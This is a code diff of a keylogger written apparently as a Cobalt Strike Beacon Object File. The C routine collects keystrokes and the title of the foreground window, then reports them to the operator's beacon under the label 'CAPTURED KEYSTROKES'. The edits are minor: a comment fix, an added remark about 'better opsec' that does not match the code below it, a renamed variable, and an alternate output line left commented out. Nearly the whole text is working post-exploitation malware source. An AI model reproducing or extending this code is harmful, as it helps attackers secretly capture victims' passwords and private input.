@@ -120,14 +120,16 @@ int go(char *args, int len) {
 			USER32$DispatchMessageA(&msg);
 		}
 		
-		// If available, print buffered input and free buffer (it doesn't call DestroyWindowA and UnregisterClassA on purpose)
+		// If available, print buffered input and free buffer (it doesn't call DestroyWindow and UnregisterClassA on purpose)
 		if (bufPos > 0) {
+			// disable GetForegroundWindow() for some better opsec
 			LPSTR windowsName[250];
 			int maxSizeName = 250;
-			HWND foreground = USER32$GetForegroundWindow();
-			USER32$GetWindowTextA(foreground, windowsName, maxSizeName);
+			HWND fg = USER32$GetForegroundWindow();
+			USER32$GetWindowTextA(fg, windowsName, maxSizeName);
 			
 			BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n[*] Current selected tab/window: %s\n================================================================================================================\n\n%s\n", windowsName, inputBuf);
+			//BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n================================================================================================================\n\n%s\n", inputBuf);
 		} else {
 			BeaconPrintf(CALLBACK_OUTPUT, "[*] Keylogger is running.. no keystrokes captured jet.\n");
 		}
@@ -156,3 +158,5 @@ int go(char *args, int len) {
 	
     return 0;
 }
+
+
